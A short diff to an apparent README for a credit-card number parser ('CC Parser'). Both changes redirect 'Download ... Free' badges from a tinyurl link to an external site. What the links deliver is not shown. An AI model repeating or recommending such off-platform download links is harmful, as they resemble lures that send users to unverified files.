@@ -10,7 +10,7 @@
 
 <div align="center">
 
-[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)
+[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/ccparser-card)
 
 </div>
  
@@ -139,4 +139,4 @@ Contributions are welcome. Please review our CONTRIBUTING.md file before submitt
 - Luhn Algorithm  
 - Python regular expressions
 
-[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/ccparser-card)
+[![Download CC Parser Free](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/ccparser-card)
